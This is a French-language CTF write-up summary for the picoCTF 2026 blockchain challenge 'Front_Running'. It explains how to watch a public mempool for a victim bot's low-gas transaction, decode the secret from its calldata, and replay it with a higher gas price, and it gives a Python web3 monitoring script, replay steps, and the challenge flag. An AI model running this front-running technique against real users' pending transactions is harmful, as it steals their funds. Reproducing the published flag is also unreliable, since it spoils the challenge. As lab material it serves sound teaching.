# 744 — Front_Running

**Événement** : picoCTF 2026 · **Catégorie** : Blockchain

> Synthèse rédigée à partir des sources publiques listées en fin de fiche : ce challenge a été
> résolu côté CyLab Academy, mais le writeup d'origine n'a pas été conservé.

## Énoncé

> A mysterious vault has been discovered on the blockchain. It's programmed to release a secret flag
> to anyone who can provide the correct pre-image to a specific hash. A Victim Bot has found the
> answer and is trying to submit it, but they are being very stingy with their gas price.

Le contrat `FrontRunning.sol` est fourni.

## Analyse

Le contrat expose une fonction `unlock(string)` qui vérifie un pré-image de hash (le « secret ») et
un `getFlag()` qui ne rend le flag qu'à l'attaquant passé en premier. Le bot victime soumet le bon
pré-image avec un **gas price très bas** : sa transaction reste donc visible dans la mempool
publique avant d'être minée. Toute la calldata est lisible ; il suffit de décoder l'argument
`string` et de resoumettre la même valeur avec un gas price strictement supérieur pour être ordonné
avant la victime (les validateurs trient par gas price décroissant).

## Solution

1. Calculer le sélecteur localement puis surveiller la mempool :

```python
from web3 import Web3
from eth_utils import keccak
from eth_abi import decode as abi_decode
w3 = Web3(Web3.HTTPProvider("http://<HOST>:<PORT>"))
sel = keccak(b"unlock(string)")[:4].hex()          # a96ce7aa
f = w3.eth.filter("pending")
for h in f.get_new_entries():
    tx = w3.eth.get_transaction(h)
    if tx.to and tx.to.lower() == CONTRACT.lower() and tx["input"].hex()[2:].startswith(sel):
        print(abi_decode(["string"], bytes.fromhex(tx["input"].hex()[10:])))
```

2. Rejouer le pré-image avec `gasPrice = 2 × gasPrice(victime)` (ou toute valeur supérieure), en
   signant la transaction soi-même (`build_transaction` → `sign_transaction` →
   `send_raw_transaction`, car `transact()` exige un compte déverrouillé côté nœud).
3. Une fois la transaction minée avant celle du bot, lire le flag en lecture seule :
   `cast call <CONTRACT> 'getFlag()(string)' --rpc-url http://<HOST>:<PORT>`.

## Flag

```
picoCTF{m3mp00l_h31st_bb7e7913}
```

Flag complet publié par le writeup Shukularuni (transcription d'exécution : la sortie de `getFlag()`
diffère bien du pré-image `picoCTF{m3mp00l_p1r4t3}` volé dans la mempool) ; le préfixe
`picoCTF{m3mp00l_h31st_` est corroboré par picoCTF Solutions.

## Sources

- [picoCTF Solutions — Front_Running (picoCTF 2026)](https://picoctfsolutions.com/picoctf-2026-front-running)
- [Shukularuni — guide Front_Running (picoCTF 2026)](https://shukularuni.neocities.org/guide/ctf/picoctf/eth/Front_Running)
- [Kur0Sh1r0 — picoCTF 2026, Blockchain](https://kur0sh1r0.gitbook.io/ctf-writeups/picoctf-2026/blockchain)
